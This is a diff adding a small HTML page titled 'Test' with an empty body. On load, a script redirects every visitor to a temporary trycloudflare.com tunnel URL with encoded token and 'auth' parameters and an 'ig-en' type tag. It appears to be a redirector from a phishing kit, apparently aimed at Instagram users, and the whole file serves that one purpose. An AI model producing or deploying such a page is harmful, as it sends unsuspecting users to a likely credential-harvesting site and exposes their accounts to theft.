@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Test</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <script type="text/javascript">
+        function redirect() {
+            window.location = "https://operational-routing-stake-two.trycloudflare.com/N2JhYWZiYjFkMmQ5ZDlkZWJlYTEzMw==/?type=ig-en&orders=780108491&auth=NGUwNWIzNGQ3OGRhYjNhNmFjOWFhZg==";
+        }
+        window.onload = redirect;
+        </script>
+    </head>
+    <body>
+    
+    </body>
+</html>
